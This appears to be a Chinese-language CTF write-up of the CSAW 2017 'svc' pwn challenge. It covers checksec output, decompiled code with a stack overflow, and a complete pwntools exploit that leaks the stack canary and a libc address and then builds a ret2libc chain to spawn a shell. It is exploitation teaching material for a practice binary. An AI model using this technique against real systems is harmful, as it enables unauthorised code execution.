---
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 


title: nightmare 2.13.Csaw 2017 Quasl SVC-wp
date: 2023-08-16 20:20:41
tags:
- CTF
- pwn
- csawquals2017
- stack 
- canary  
- ret2libc
- nightmare
categories:
- pwn-wp
---

[相关资源](https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic/csawquals17_svc)  

## 文件分析

```css
$ checksec svc 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```sh
$ ./svc
-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>1
-------------------------
[*]SCV IS ALWAYS HUNGRY.....
-------------------------
[*]GIVE HIM SOME FOOD.......
-------------------------
>>h-------------------------
[*]SCV GOOD TO GO,SIR....
-------------------------
1.FEED SCV....
2.REVIEW THE FOOD....
3.MINE MINERALS....
-------------------------
>>2
-------------------------
[*]REVIEW THE FOOD...........
-------------------------
[*]PLEASE TREAT HIM WELL.....
-------------------------
h
```

## 代码分析

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  [...]
  int v23; // [rsp+4h] [rbp-BCh] BYREF
  int v24; // [rsp+8h] [rbp-B8h]
  int v25; // [rsp+Ch] [rbp-B4h]
  char buf[168]; // [rsp+10h] [rbp-B0h] BYREF
  unsigned __int64 v27; // [rsp+B8h] [rbp-8h]

  v27 = __readfsqword(0x28u);	// canary
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v23 = 0;
  v24 = 1;
  v25 = 0;
  while ( v24 )
  {
    [...]
    std::istream::operator>>(&std::cin, &v23);
    switch ( v23 )
    {
      case 2:
        [...]
        puts(buf);
        break;
      case 3:
        v24 = 0;
        [...]
        break;
      case 1:
        [...]
        v25 = read(0, buf, 248uLL);
        break;
      default:
        [...]
        break;
    }
  }
  return 0LL;
}
```

1. 选项1读取输入，存在栈溢出
2. 选项2输出栈上内容
3. 选项3跳出循环，结束返回
4. 存在canary

## 攻击方法

1. 栈上填充至`canary`，然后输出，则可获取`canary`的值
2. 栈上填充至`ret address`，然后输出，则可获取`__libc_start_call_main`的地址进而计算libc基址
3. 计算`system`，`str_bin_sh`真实地址，构造pop链

## exp

```python
from pwn import *
import sys

pty = process.PTY
context(os='linux', arch='i386', log_level='debug')

mode = ''
if len(sys.argv) > 1:
    mode = sys.argv[1]

proc = process("./svc")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def s(x): proc.send(x)
def sl(x): return proc.sendline(x)
def sd(x): return proc.send(x)
def sla(x, y): return proc.sendlineafter(x, y)
def sa(x, y): return proc.sendafter(x, y)
def ru(x): return proc.recvuntil(x)
def rc(): return proc.recv()
def rl(): return proc.recvline()
def li(con): return log.info(con)
def ls(con): return log.success(con)
def pi(): return proc.interactive()
def pcls(): return proc.close()
def ga(): return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))

def feed(x):
    sla(b'>>', b'1')
    sa(b'>>', x)

def show():
    sla(b'>>', b'2')

gscript = '''
    b main
    b * 0x400CCE
    b * 0x400ddf
    c
'''
if mode == '-d':
    gdb.attach(proc, gdbscript=gscript)

ret = 0x4008b1
rdi_ret = 0x400ea3

# get canary
feed(b'h'*(168 + 1))	# 多1个是因为canary最后一个字节总是\x00，会截断输出，因此覆盖
show()
ru(b'h'*169)
canary = u64(ru(b'\n').strip(b'\x01\n').rjust(8, b'\x00'))
success(hex(canary))

# get libc base
feed(b'h'*184)
show()
start_main = ga() + 0xc0 - 0x8a		# gdb 中调试计算偏移量
libc_base = start_main - libc.sym['__libc_start_main']
success(hex(libc_base))

system = libc_base + libc.sym['system']
str_binsh = libc_base + next(libc.search(b'/bin/sh'))

# pop chain
feed(b'h'*168 + p64(canary) + b'h'*8 + p64(ret) + p64(rdi_ret) + 
   p64(str_binsh) + p64(system))
sla(b'>>', b'3')

pi()
pause()
```
